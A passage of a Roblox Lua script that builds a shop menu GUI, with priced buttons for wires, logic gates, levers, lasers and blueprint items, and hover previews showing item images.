CanOfWorms = Instance.new("TextButton")
CanOfWorms.Name = "LightBulb"
CanOfWorms.Parent = BobsCarPics
CanOfWorms.BackgroundColor3 = Color3.new(0, 0, 0)
CanOfWorms.BorderColor3 = Color3.fromRGB(151, 0, 0)
CanOfWorms.BackgroundTransparency = 0.6
CanOfWorms.Position = UDim2.new(0, 5, 0, 325)
CanOfWorms.Size = UDim2.new(0, 173, 0, 20)
CanOfWorms.Font = Enum.Font.Fantasy
CanOfWorms.Text = "Can Of Worms (3200)"
CanOfWorms.TextColor3 = Color3.new(1, 1, 1)
CanOfWorms.TextSize = 14
CanOfWorms.MouseButton1Down:connect(function()
Item.Text = "CanOfWorms"
end)

InfoText128 = Instance.new("ImageLabel")
InfoText128.Name = "ImageLabel"
InfoText128.Parent = MainFrame
InfoText128.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText128.BackgroundTransparency = 1
InfoText128.Position = UDim2.new(0, 40, 0, 200)
InfoText128.Size = UDim2.new(0, 100, 0, 100)
InfoText128.Image = "rbxassetid://3709579059"
InfoText128.Visible = false

CanOfWorms.MouseEnter:connect(function()
InfoText128.Visible = true
end)

CanOfWorms.MouseLeave:connect(function()
InfoText128.Visible = false
end)

ls = Instance.new("TextButton")
ls.Name = "ls"
ls.Parent = BuyFrame
ls.BackgroundColor3 = Color3.new(0, 0, 0)
ls.BorderColor3 = Color3.new(1, 0, 0)
ls.Position =  UDim2.new(0, 3, 0, 72)
ls.BackgroundTransparency = 0.6
ls.Size = UDim2.new(0, 164, 0, 20)
ls.Font = Enum.Font.Fantasy
ls.Text = "Logic Store"
ls.TextColor3 = Color3.new(1, 1, 1)
ls.TextSize = 14
ls.MouseButton1Click:connect(function()
BuyFrame.Visible = true
TimesFrame.Visible = false
makesound("rbxassetid://156785206")
end)

LogicStore = Instance.new("ScrollingFrame")
LogicStore.Name = "LogicStore"
LogicStore.Parent = MenuFrame
LogicStore.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
LogicStore.Position =  UDim2.new(0, 179, 0, 0)
LogicStore.BackgroundTransparency = 0.5
LogicStore.BorderColor3 = Color3.new(0, 0, 0)
LogicStore.Size = UDim2.new(0, 195, 0, 400)
LogicStore.CanvasPosition = Vector2.new(0,0)
LogicStore.CanvasSize = UDim2.new(0, 0, 0, 510)
LogicStore.Visible = false

Wire = Instance.new("TextButton")
Wire.Name = "Wire"
Wire.Parent = LogicStore
Wire.BackgroundColor3 = Color3.new(0, 0, 0)
Wire.BorderColor3 = Color3.fromRGB(151, 0, 0)
Wire.BackgroundTransparency = 0.6
Wire.Position = UDim2.new(0, 5, 0, 3)
Wire.Size = UDim2.new(0, 173, 0, 20)
Wire.Font = Enum.Font.Fantasy
Wire.Text = "Wire (205)"
Wire.TextColor3 = Color3.new(1, 1, 1)
Wire.TextSize = 14
Wire.MouseButton1Down:connect(function()
Item.Text = "Wire"
end)

InfoText129 = Instance.new("ImageLabel")
InfoText129.Name = "ImageLabel"
InfoText129.Parent = MainFrame
InfoText129.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText129.BackgroundTransparency = 1
InfoText129.Position = UDim2.new(0, 40, 0, 200)
InfoText129.Size = UDim2.new(0, 100, 0, 100)
InfoText129.Image = "rbxassetid://3709112709"
InfoText129.Visible = false

Wire.MouseEnter:connect(function()
InfoText129.Visible = true
end)

Wire.MouseLeave:connect(function()
InfoText129.Visible = false
end)

NeonWireRed = Instance.new("TextButton")
NeonWireRed.Name = "NeonWireRed"
NeonWireRed.Parent = LogicStore
NeonWireRed.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireRed.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireRed.BackgroundTransparency = 0.6
NeonWireRed.Position = UDim2.new(0, 5, 0, 26)
NeonWireRed.Size = UDim2.new(0, 173, 0, 20)
NeonWireRed.Font = Enum.Font.Fantasy
NeonWireRed.Text = "Neon Wire Red (720)"
NeonWireRed.TextColor3 = Color3.new(1, 1, 1)
NeonWireRed.TextSize = 14
NeonWireRed.MouseButton1Down:connect(function()
Item.Text = "NeonWireRed"
end)

InfoText130 = Instance.new("ImageLabel")
InfoText130.Name = "ImageLabel"
InfoText130.Parent = MainFrame
InfoText130.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText130.BackgroundTransparency = 1
InfoText130.Position = UDim2.new(0, 40, 0, 200)
InfoText130.Size = UDim2.new(0, 100, 0, 100)
InfoText130.Image = "rbxassetid://3709109941"
InfoText130.Visible = false

NeonWireRed.MouseEnter:connect(function()
InfoText130.Visible = true
end)

NeonWireRed.MouseLeave:connect(function()
InfoText130.Visible = false
end)

NeonWireOrange = Instance.new("TextButton")
NeonWireOrange.Name = "NeonWireOrange"
NeonWireOrange.Parent = LogicStore
NeonWireOrange.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireOrange.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireOrange.BackgroundTransparency = 0.6
NeonWireOrange.Position = UDim2.new(0, 5, 0, 49)
NeonWireOrange.Size = UDim2.new(0, 173, 0, 20)
NeonWireOrange.Font = Enum.Font.Fantasy
NeonWireOrange.Text = "Neon Wire Orange (720)"
NeonWireOrange.TextColor3 = Color3.new(1, 1, 1)
NeonWireOrange.TextSize = 14
NeonWireOrange.MouseButton1Down:connect(function()
Item.Text = "NeonWireOrange"
end)

InfoText131 = Instance.new("ImageLabel")
InfoText131.Name = "ImageLabel"
InfoText131.Parent = MainFrame
InfoText131.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText131.BackgroundTransparency = 1
InfoText131.Position = UDim2.new(0, 40, 0, 200)
InfoText131.Size = UDim2.new(0, 100, 0, 100)
InfoText131.Image = "rbxassetid://3709109310"
InfoText131.Visible = false

NeonWireOrange.MouseEnter:connect(function()
InfoText131.Visible = true
end)

NeonWireOrange.MouseLeave:connect(function()
InfoText131.Visible = false
end)

NeonWireYellow = Instance.new("TextButton")
NeonWireYellow.Name = "NeonWireYellow"
NeonWireYellow.Parent = LogicStore
NeonWireYellow.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireYellow.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireYellow.BackgroundTransparency = 0.6
NeonWireYellow.Position = UDim2.new(0, 5, 0, 72)
NeonWireYellow.Size = UDim2.new(0, 173, 0, 20)
NeonWireYellow.Font = Enum.Font.Fantasy
NeonWireYellow.Text = "Neon Wire Yellow (720)"
NeonWireYellow.TextColor3 = Color3.new(1, 1, 1)
NeonWireYellow.TextSize = 14
NeonWireYellow.MouseButton1Down:connect(function()
Item.Text = "NeonWireYellow"
end)

InfoText132 = Instance.new("ImageLabel")
InfoText132.Name = "ImageLabel"
InfoText132.Parent = MainFrame
InfoText132.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText132.BackgroundTransparency = 1
InfoText132.Position = UDim2.new(0, 40, 0, 200)
InfoText132.Size = UDim2.new(0, 100, 0, 100)
InfoText132.Image = "rbxassetid://3709110967"
InfoText132.Visible = false

NeonWireYellow.MouseEnter:connect(function()
InfoText132.Visible = true
end)

NeonWireYellow.MouseLeave:connect(function()
InfoText132.Visible = false
end)

NeonWireGreen = Instance.new("TextButton")
NeonWireGreen.Name = "NeonWireGreen"
NeonWireGreen.Parent = LogicStore
NeonWireGreen.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireGreen.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireGreen.BackgroundTransparency = 0.6
NeonWireGreen.Position = UDim2.new(0, 5, 0, 95)
NeonWireGreen.Size = UDim2.new(0, 173, 0, 20)
NeonWireGreen.Font = Enum.Font.Fantasy
NeonWireGreen.Text = "Neon Wire Green (720)"
NeonWireGreen.TextColor3 = Color3.new(1, 1, 1)
NeonWireGreen.TextSize = 14
NeonWireGreen.MouseButton1Down:connect(function()
Item.Text = "NeonWireGreen"
end)

InfoText133 = Instance.new("ImageLabel")
InfoText133.Name = "ImageLabel"
InfoText133.Parent = MainFrame
InfoText133.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText133.BackgroundTransparency = 1
InfoText133.Position = UDim2.new(0, 40, 0, 200)
InfoText133.Size = UDim2.new(0, 100, 0, 100)
InfoText133.Image = "rbxassetid://3709109003"
InfoText133.Visible = false

NeonWireGreen.MouseEnter:connect(function()
InfoText133.Visible = true
end)

NeonWireGreen.MouseLeave:connect(function()
InfoText133.Visible = false
end)

NeonWireCyan = Instance.new("TextButton")
NeonWireCyan.Name = "NeonWireCyan"
NeonWireCyan.Parent = LogicStore
NeonWireCyan.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireCyan.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireCyan.BackgroundTransparency = 0.6
NeonWireCyan.Position = UDim2.new(0, 5, 0, 118)
NeonWireCyan.Size = UDim2.new(0, 173, 0, 20)
NeonWireCyan.Font = Enum.Font.Fantasy
NeonWireCyan.Text = "Neon Wire Cyan (720)"
NeonWireCyan.TextColor3 = Color3.new(1, 1, 1)
NeonWireCyan.TextSize = 14
NeonWireCyan.MouseButton1Down:connect(function()
Item.Text = "NeonWireCyan"
end)

InfoText134 = Instance.new("ImageLabel")
InfoText134.Name = "ImageLabel"
InfoText134.Parent = MainFrame
InfoText134.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText134.BackgroundTransparency = 1
InfoText134.Position = UDim2.new(0, 40, 0, 200)
InfoText134.Size = UDim2.new(0, 100, 0, 100)
InfoText134.Image = "rbxassetid://3709108577"
InfoText134.Visible = false

NeonWireCyan.MouseEnter:connect(function()
InfoText134.Visible = true
end)

NeonWireCyan.MouseLeave:connect(function()
InfoText134.Visible = false
end)

NeonWireBlue = Instance.new("TextButton")
NeonWireBlue.Name = "NeonWireBlue"
NeonWireBlue.Parent = LogicStore
NeonWireBlue.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireBlue.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireBlue.BackgroundTransparency = 0.6
NeonWireBlue.Position = UDim2.new(0, 5, 0, 141)
NeonWireBlue.Size = UDim2.new(0, 173, 0, 20)
NeonWireBlue.Font = Enum.Font.Fantasy
NeonWireBlue.Text = "Neon Wire Blue (720)"
NeonWireBlue.TextColor3 = Color3.new(1, 1, 1)
NeonWireBlue.TextSize = 14
NeonWireBlue.MouseButton1Down:connect(function()
Item.Text = "NeonWireBlue"
end)

InfoText135 = Instance.new("ImageLabel")
InfoText135.Name = "ImageLabel"
InfoText135.Parent = MainFrame
InfoText135.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText135.BackgroundTransparency = 1
InfoText135.Position = UDim2.new(0, 40, 0, 200)
InfoText135.Size = UDim2.new(0, 100, 0, 100)
InfoText135.Image = "rbxassetid://3709108148"
InfoText135.Visible = false

NeonWireBlue.MouseEnter:connect(function()
InfoText135.Visible = true
end)

NeonWireBlue.MouseLeave:connect(function()
InfoText135.Visible = false
end)

NeonWireViolet = Instance.new("TextButton")
NeonWireViolet.Name = "NeonWireViolet"
NeonWireViolet.Parent = LogicStore
NeonWireViolet.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireViolet.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireViolet.BackgroundTransparency = 0.6
NeonWireViolet.Position = UDim2.new(0, 5, 0, 164)
NeonWireViolet.Size = UDim2.new(0, 173, 0, 20)
NeonWireViolet.Font = Enum.Font.Fantasy
NeonWireViolet.Text = "Neon Wire Violet (720)"
NeonWireViolet.TextColor3 = Color3.new(1, 1, 1)
NeonWireViolet.TextSize = 14
NeonWireViolet.MouseButton1Down:connect(function()
Item.Text = "NeonWireViolet"
end)

InfoText136 = Instance.new("ImageLabel")
InfoText136.Name = "ImageLabel"
InfoText136.Parent = MainFrame
InfoText136.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText136.BackgroundTransparency = 1
InfoText136.Position = UDim2.new(0, 40, 0, 200)
InfoText136.Size = UDim2.new(0, 100, 0, 100)
InfoText136.Image = "rbxassetid://3709110281"
InfoText136.Visible = false

NeonWireViolet.MouseEnter:connect(function()
InfoText136.Visible = true
end)

NeonWireViolet.MouseLeave:connect(function()
InfoText136.Visible = false
end)

NeonWireWhite = Instance.new("TextButton")
NeonWireWhite.Name = "NeonWireWhite"
NeonWireWhite.Parent = LogicStore
NeonWireWhite.BackgroundColor3 = Color3.new(0, 0, 0)
NeonWireWhite.BorderColor3 = Color3.fromRGB(151, 0, 0)
NeonWireWhite.BackgroundTransparency = 0.6
NeonWireWhite.Position = UDim2.new(0, 5, 0, 187)
NeonWireWhite.Size = UDim2.new(0, 173, 0, 20)
NeonWireWhite.Font = Enum.Font.Fantasy
NeonWireWhite.Text = "NeonWireWhite (720)"
NeonWireWhite.TextColor3 = Color3.new(1, 1, 1)
NeonWireWhite.TextSize = 14
NeonWireWhite.MouseButton1Down:connect(function()
Item.Text = "NeonWireWhite"
end)

InfoText137 = Instance.new("ImageLabel")
InfoText137.Name = "ImageLabel"
InfoText137.Parent = MainFrame
InfoText137.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText137.BackgroundTransparency = 1
InfoText137.Position = UDim2.new(0, 40, 0, 200)
InfoText137.Size = UDim2.new(0, 100, 0, 100)
InfoText137.Image = "rbxassetid://3709110631"
InfoText137.Visible = false

NeonWireWhite.MouseEnter:connect(function()
InfoText137.Visible = true
end)

NeonWireWhite.MouseLeave:connect(function()
InfoText137.Visible = false
end)

GateNOT = Instance.new("TextButton")
GateNOT.Name = "GateNOT"
GateNOT.Parent = LogicStore
GateNOT.BackgroundColor3 = Color3.new(0, 0, 0)
GateNOT.BorderColor3 = Color3.fromRGB(151, 0, 0)
GateNOT.BackgroundTransparency = 0.6
GateNOT.Position = UDim2.new(0, 5, 0, 210)
GateNOT.Size = UDim2.new(0, 173, 0, 20)
GateNOT.Font = Enum.Font.Fantasy
GateNOT.Text = "NotGate (200)"
GateNOT.TextColor3 = Color3.new(1, 1, 1)
GateNOT.TextSize = 14
GateNOT.MouseButton1Down:connect(function()
Item.Text = "GateNOT"
end)

InfoText138 = Instance.new("ImageLabel")
InfoText138.Name = "ImageLabel"
InfoText138.Parent = MainFrame
InfoText138.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText138.BackgroundTransparency = 1
InfoText138.Position = UDim2.new(0, 40, 0, 200)
InfoText138.Size = UDim2.new(0, 100, 0, 100)
InfoText138.Image = "rbxassetid://3709182645"
InfoText138.Visible = false

GateNOT.MouseEnter:connect(function()
InfoText138.Visible = true
end)

GateNOT.MouseLeave:connect(function()
InfoText138.Visible = false
end)

GateAND = Instance.new("TextButton")
GateAND.Name = "GateAND"
GateAND.Parent = LogicStore
GateAND.BackgroundColor3 = Color3.new(0, 0, 0)
GateAND.BorderColor3 = Color3.fromRGB(151, 0, 0)
GateAND.BackgroundTransparency = 0.6
GateAND.Position = UDim2.new(0, 5, 0, 233)
GateAND.Size = UDim2.new(0, 173, 0, 20)
GateAND.Font = Enum.Font.Fantasy
GateAND.FontSize = Enum.FontSize.Size18
GateAND.Text = "AndGate (260)"
GateAND.TextColor3 = Color3.new(1, 1, 1)
GateAND.TextSize = 14
GateAND.MouseButton1Down:connect(function()
Item.Text = "GateAND"
end)

InfoText139 = Instance.new("ImageLabel")
InfoText139.Name = "ImageLabel"
InfoText139.Parent = MainFrame
InfoText139.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText139.BackgroundTransparency = 1
InfoText139.Position = UDim2.new(0, 40, 0, 200)
InfoText139.Size = UDim2.new(0, 100, 0, 100)
InfoText139.Image = "rbxassetid://3709102307"
InfoText139.Visible = false

GateAND.MouseEnter:connect(function()
InfoText139.Visible = true
end)

GateAND.MouseLeave:connect(function()
InfoText139.Visible = false
end)

GateOR = Instance.new("TextButton")
GateOR.Name = "GateOR"
GateOR.Parent = LogicStore
GateOR.BackgroundColor3 = Color3.new(0, 0, 0)
GateOR.BorderColor3 = Color3.fromRGB(151, 0, 0)
GateOR.BackgroundTransparency = 0.6
GateOR.Position = UDim2.new(0, 5, 0, 256)
GateOR.Size = UDim2.new(0, 173, 0, 20)
GateOR.Font = Enum.Font.Fantasy
GateOR.Text = "ORGate (260)"
GateOR.TextColor3 = Color3.new(1, 1, 1)
GateOR.TextSize = 14
GateOR.MouseButton1Down:connect(function()
Item.Text = "GateOR"
end)

InfoText140 = Instance.new("ImageLabel")
InfoText140.Name = "ImageLabel"
InfoText140.Parent = MainFrame
InfoText140.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText140.BackgroundTransparency = 1
InfoText140.Position = UDim2.new(0, 40, 0, 200)
InfoText140.Size = UDim2.new(0, 100, 0, 100)
InfoText140.Image = "rbxassetid://3709103299"
InfoText140.Visible = false

GateOR.MouseEnter:connect(function()
InfoText140.Visible = true
end)

GateOR.MouseLeave:connect(function()
InfoText140.Visible = false
end)

GateXOR = Instance.new("TextButton")
GateXOR.Name = "GateXOR"
GateXOR.Parent = LogicStore
GateXOR.BackgroundColor3 = Color3.new(0, 0, 0)
GateXOR.BorderColor3 = Color3.fromRGB(151, 0, 0)
GateXOR.BackgroundTransparency = 0.6
GateXOR.Position = UDim2.new(0, 5, 0, 279)
GateXOR.Size = UDim2.new(0, 173, 0, 20)
GateXOR.Font = Enum.Font.Fantasy
GateXOR.Text = "XORGate (260)"
GateXOR.TextColor3 = Color3.new(1, 1, 1)
GateXOR.TextSize = 14
GateXOR.MouseButton1Down:connect(function()
Item.Text = "GateXOR"
end)

InfoText141 = Instance.new("ImageLabel")
InfoText141.Name = "ImageLabel"
InfoText141.Parent = MainFrame
InfoText141.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText141.BackgroundTransparency = 1
InfoText141.Position = UDim2.new(0, 40, 0, 200)
InfoText141.Size = UDim2.new(0, 100, 0, 100)
InfoText141.Image = "rbxassetid://3709103653"
InfoText141.Visible = false

GateXOR.MouseEnter:connect(function()
InfoText141.Visible = true
end)

GateXOR.MouseLeave:connect(function()
InfoText141.Visible = false
end)

SignalSustain = Instance.new("TextButton")
SignalSustain.Name = "SignalSustain"
SignalSustain.Parent = LogicStore
SignalSustain.BackgroundColor3 = Color3.new(0, 0, 0)
SignalSustain.BorderColor3 = Color3.fromRGB(151, 0, 0)
SignalSustain.BackgroundTransparency = 0.6
SignalSustain.Position = UDim2.new(0, 5, 0, 302)
SignalSustain.Size = UDim2.new(0, 173, 0, 20)
SignalSustain.Font = Enum.Font.Fantasy
SignalSustain.Text = "Signal Sustain (520)"
SignalSustain.TextColor3 = Color3.new(1, 1, 1)
SignalSustain.TextSize = 14
SignalSustain.MouseButton1Down:connect(function()
Item.Text = "SignalSustain"
end)

InfoText142 = Instance.new("ImageLabel")
InfoText142.Name = "ImageLabel"
InfoText142.Parent = MainFrame
InfoText142.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText142.BackgroundTransparency = 1
InfoText142.Position = UDim2.new(0, 40, 0, 200)
InfoText142.Size = UDim2.new(0, 100, 0, 100)
InfoText142.Image = "rbxassetid://3709111644"
InfoText142.Visible = false

SignalSustain.MouseEnter:connect(function()
InfoText142.Visible = true
end)

SignalSustain.MouseLeave:connect(function()
InfoText142.Visible = false
end)

WoodChecker = Instance.new("TextButton")
WoodChecker.Name = "WoodChecker"
WoodChecker.Parent = LogicStore
WoodChecker.BackgroundColor3 = Color3.new(0, 0, 0)
WoodChecker.BorderColor3 = Color3.fromRGB(151, 0, 0)
WoodChecker.BackgroundTransparency = 0.6
WoodChecker.Position = UDim2.new(0, 5, 0, 325)
WoodChecker.Size = UDim2.new(0, 173, 0, 20)
WoodChecker.Font = Enum.Font.Fantasy
WoodChecker.Text = "Wood Checker (11300)"
WoodChecker.TextColor3 = Color3.new(1, 1, 1)
WoodChecker.TextSize = 14
WoodChecker.MouseButton1Down:connect(function()
Item.Text = "WoodChecker"
end)

InfoText143 = Instance.new("ImageLabel")
InfoText143.Name = "ImageLabel"
InfoText143.Parent = MainFrame
InfoText143.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText143.BackgroundTransparency = 1
InfoText143.Position = UDim2.new(0, 40, 0, 200)
InfoText143.Size = UDim2.new(0, 100, 0, 100)
InfoText143.Image = "rbxassetid://3210561379"
InfoText143.Visible = false

WoodChecker.MouseEnter:connect(function()
InfoText143.Visible = true
end)

WoodChecker.MouseLeave:connect(function()
InfoText143.Visible = false
end)

Lever0 = Instance.new("TextButton")
Lever0.Name = "Lever0"
Lever0.Parent = LogicStore
Lever0.BackgroundColor3 = Color3.new(0, 0, 0)
Lever0.BorderColor3 = Color3.fromRGB(151, 0, 0)
Lever0.BackgroundTransparency = 0.6
Lever0.Position = UDim2.new(0, 5, 0,348)
Lever0.Size = UDim2.new(0, 173, 0, 20)
Lever0.Font = Enum.Font.Fantasy
Lever0.Text = "Lever (640)"
Lever0.TextColor3 = Color3.new(1, 1, 1)
Lever0.TextSize = 14
Lever0.MouseButton1Down:connect(function()
Item.Text = "Lever0"
end)

InfoText144 = Instance.new("ImageLabel")
InfoText144.Name = "ImageLabel"
InfoText144.Parent = MainFrame
InfoText144.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText144.BackgroundTransparency = 1
InfoText144.Position = UDim2.new(0, 40, 0, 200)
InfoText144.Size = UDim2.new(0, 100, 0, 100)
InfoText144.Image = "rbxassetid://3709107707"
InfoText144.Visible = false

Lever0.MouseEnter:connect(function()
InfoText144.Visible = true
end)

Lever0.MouseLeave:connect(function()
InfoText144.Visible = false
end)

Button0 = Instance.new("TextButton")
Button0.Name = "Button0"
Button0.Parent = LogicStore
Button0.BackgroundColor3 = Color3.new(0, 0, 0)
Button0.BorderColor3 = Color3.fromRGB(151, 0, 0)
Button0.BackgroundTransparency = 0.6
Button0.Position = UDim2.new(0, 5, 0, 371)
Button0.Size = UDim2.new(0, 173, 0, 20)
Button0.Font = Enum.Font.Fantasy
Button0.Text = "Button (320)"
Button0.TextColor3 = Color3.new(1, 1, 1)
Button0.TextSize = 14
Button0.MouseButton1Down:connect(function()
Item.Text = "Button0"
end)

InfoText145 = Instance.new("ImageLabel")
InfoText145.Name = "ImageLabel"
InfoText145.Parent = MainFrame
InfoText145.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText145.BackgroundTransparency = 1
InfoText145.Position = UDim2.new(0, 40, 0, 200)
InfoText145.Size = UDim2.new(0, 100, 0, 100)
InfoText145.Image = "rbxassetid://3709101697"
InfoText145.Visible = false

Button0.MouseEnter:connect(function()
InfoText145.Visible = true
end)

Button0.MouseLeave:connect(function()
InfoText145.Visible = false
end)

Laser = Instance.new("TextButton")
Laser.Name = "Laser"
Laser.Parent = LogicStore
Laser.BackgroundColor3 = Color3.new(0, 0, 0)
Laser.BorderColor3 = Color3.fromRGB(151, 0, 0)
Laser.BackgroundTransparency = 0.6
Laser.Position = UDim2.new(0, 5, 0, 394)
Laser.Size = UDim2.new(0, 173, 0, 20)
Laser.Font = Enum.Font.Fantasy
Laser.Text = "Laser (11300)"
Laser.TextColor3 = Color3.new(1, 1, 1)
Laser.TextSize = 14
Laser.MouseButton1Down:connect(function()
Item.Text = "Laser"
end)

InfoText146 = Instance.new("ImageLabel")
InfoText146.Name = "ImageLabel"
InfoText146.Parent = MainFrame
InfoText146.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText146.BackgroundTransparency = 1
InfoText146.Position = UDim2.new(0, 40, 0, 200)
InfoText146.Size = UDim2.new(0, 100, 0, 100)
InfoText146.Image = "rbxassetid://3709106668"
InfoText146.Visible = false

Laser.MouseEnter:connect(function()
InfoText146.Visible = true
end)

Laser.MouseLeave:connect(function()
InfoText146.Visible = false
end)

LaserReceiver = Instance.new("TextButton")
LaserReceiver.Name = "LaserReceiver"
LaserReceiver.Parent = LogicStore
LaserReceiver.BackgroundColor3 = Color3.new(0, 0, 0)
LaserReceiver.BorderColor3 = Color3.fromRGB(151, 0, 0)
LaserReceiver.BackgroundTransparency = 0.6
LaserReceiver.Position = UDim2.new(0, 5, 0, 417)
LaserReceiver.Size = UDim2.new(0, 173, 0, 20)
LaserReceiver.Font = Enum.Font.Fantasy
LaserReceiver.Text = "Laser Receiver (3200)"
LaserReceiver.TextColor3 = Color3.new(1, 1, 1)
LaserReceiver.TextSize = 14
LaserReceiver.MouseButton1Down:connect(function()
Item.Text = "LaserReceiver"
end)

InfoText147 = Instance.new("ImageLabel")
InfoText147.Name = "ImageLabel"
InfoText147.Parent = MainFrame
InfoText147.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText147.BackgroundTransparency = 1
InfoText147.Position = UDim2.new(0, 40, 0, 200)
InfoText147.Size = UDim2.new(0, 100, 0, 100)
InfoText147.Image = "rbxassetid://3709107170"
InfoText147.Visible = false

LaserReceiver.MouseEnter:connect(function()
InfoText147.Visible = true
end)

LaserReceiver.MouseLeave:connect(function()
InfoText147.Visible = false
end)

PressurePlate = Instance.new("TextButton")
PressurePlate.Name = "PressurePlate"
PressurePlate.Parent = LogicStore
PressurePlate.BackgroundColor3 = Color3.new(0, 0, 0)
PressurePlate.BorderColor3 = Color3.fromRGB(151, 0, 0)
PressurePlate.BackgroundTransparency = 0.6
PressurePlate.Position = UDim2.new(0, 5, 0, 440)
PressurePlate.Size = UDim2.new(0, 173, 0, 20)
PressurePlate.Font = Enum.Font.Fantasy
PressurePlate.Text = "Pressure Plate (640)"
PressurePlate.TextColor3 = Color3.new(1, 1, 1)
PressurePlate.TextSize = 14
PressurePlate.MouseButton1Down:connect(function()
Item.Text = "PressurePlate"
end)

InfoText148 = Instance.new("ImageLabel")
InfoText148.Name = "ImageLabel"
InfoText148.Parent = MainFrame
InfoText148.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText148.BackgroundTransparency = 1
InfoText148.Position = UDim2.new(0, 40, 0, 200)
InfoText148.Size = UDim2.new(0, 100, 0, 100)
InfoText148.Image = "rbxassetid://3709111292"
InfoText148.Visible = false

PressurePlate.MouseEnter:connect(function()
InfoText148.Visible = true
end)

PressurePlate.MouseLeave:connect(function()
InfoText148.Visible = false
end)

Hatch = Instance.new("TextButton")
Hatch.Name = "Hatch"
Hatch.Parent = LogicStore
Hatch.BackgroundColor3 = Color3.new(0, 0, 0)
Hatch.BorderColor3 = Color3.fromRGB(151, 0, 0)
Hatch.BackgroundTransparency = 0.6
Hatch.Position = UDim2.new(0, 5, 0, 463)
Hatch.Size = UDim2.new(0, 173, 0, 20)
Hatch.Font = Enum.Font.Fantasy
Hatch.Text = "Hatch (830)"
Hatch.TextColor3 = Color3.new(1, 1, 1)
Hatch.TextSize = 14
Hatch.MouseButton1Down:connect(function()
Item.Text = "Hatch"
end)

InfoText149 = Instance.new("ImageLabel")
InfoText149.Name = "ImageLabel"
InfoText149.Parent = MainFrame
InfoText149.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText149.BackgroundTransparency = 1
InfoText149.Position = UDim2.new(0, 40, 0, 200)
InfoText149.Size = UDim2.new(0, 100, 0, 100)
InfoText149.Image = "rbxassetid://3709104176"
InfoText149.Visible = false

Hatch.MouseEnter:connect(function()
InfoText149.Visible = true
end)

Hatch.MouseLeave:connect(function()
InfoText149.Visible = false
end)

ClockSwitch = Instance.new("TextButton")
ClockSwitch.Name = "ClockSwitch"
ClockSwitch.Parent = LogicStore
ClockSwitch.BackgroundColor3 = Color3.new(0, 0, 0)
ClockSwitch.BorderColor3 = Color3.fromRGB(151, 0, 0)
ClockSwitch.BackgroundTransparency = 0.6
ClockSwitch.Position = UDim2.new(0, 5, 0, 486)
ClockSwitch.Size = UDim2.new(0, 173, 0, 20)
ClockSwitch.Font = Enum.Font.Fantasy
ClockSwitch.Text = "ClockSwitch (902)"
ClockSwitch.TextColor3 = Color3.new(1, 1, 1)
ClockSwitch.TextSize = 14
ClockSwitch.MouseButton1Down:connect(function()
Item.Text = "ClockSwitch"
end)

InfoText328 = Instance.new("ImageLabel")
InfoText328.Name = "ImageLabel"
InfoText328.Parent = MainFrame
InfoText328.BackgroundColor3 = Color3.new(1, 1, 1)
InfoText328.BackgroundTransparency = 1
InfoText328.Position = UDim2.new(0, 40, 0, 200)
InfoText328.Size = UDim2.new(0, 100, 0, 100)
InfoText328.Image = "rbxassetid://4925532404"
InfoText328.Visible = false

ClockSwitch.MouseEnter:connect(function()
InfoText328.Visible = true
end)

ClockSwitch.MouseLeave:connect(function()
InfoText328.Visible = false
end)

bp = Instance.new("TextButton")
bp.Name = "bp"
bp.Parent = BuyFrame
bp.BackgroundColor3 = Color3.new(0, 0, 0)
bp.BorderColor3 = Color3.new(1, 0, 0)
bp.Position =  UDim2.new(0, 3, 0, 95)
bp.BackgroundTransparency = 0.6
bp.Size = UDim2.new(0, 164, 0, 20)
bp.Font = Enum.Font.Fantasy
bp.Text = "Blue Prints"
bp.TextColor3 = Color3.new(1, 1, 1)
bp.TextSize = 14
bp.MouseButton1Click:connect(function()
TimesFrame.Visible = false
BuyFrame.Visible = true
  makesound("rbxassetid://156785206")
end)

BluePrint1 = Instance.new("ScrollingFrame")
BluePrint1.Name = "BluePrint1"
BluePrint1.Parent = MenuFrame
BluePrint1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
BluePrint1.Position =  UDim2.new(0, 179, 0, 0)
BluePrint1.BackgroundTransparency = 0.6
BluePrint1.BorderColor3 = Color3.new(1, 0, 0)
BluePrint1.Size = UDim2.new(0, 195, 0, 450)
BluePrint1.CanvasPosition = Vector2.new(0,0)
BluePrint1.CanvasSize = UDim2.new(0, 0, 0, 1385)
BluePrint1.Visible = false

Wedge10_Thin = Instance.new("TextButton")
Wedge10_Thin.Name = "Wedge10_Thin"
Wedge10_Thin.Parent = BluePrint1
Wedge10_Thin.BackgroundColor3 = Color3.new(0, 0, 0)
